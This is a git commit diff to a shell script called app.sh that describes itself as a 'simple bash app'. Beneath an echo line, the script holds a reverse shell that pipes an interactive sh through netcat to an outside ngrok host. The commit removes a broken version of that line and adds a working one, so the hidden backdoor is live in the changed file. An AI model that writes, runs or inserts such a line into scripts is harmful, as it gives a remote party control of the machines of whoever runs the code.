ba713f2d199686e0a7840988ec4daae82accca41
Dibyendu Sikdar <dibyendu.coder@gmail.com>
2025-05-09 23:43:46 +0200

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,3 +1,3 @@
 echo "I am simple bash app 1"
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 7.tcp.eu.ngrok.io: 17594 >/tmp/f
+mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 7.tcp.eu.ngrok.io 17594 >/tmp/f
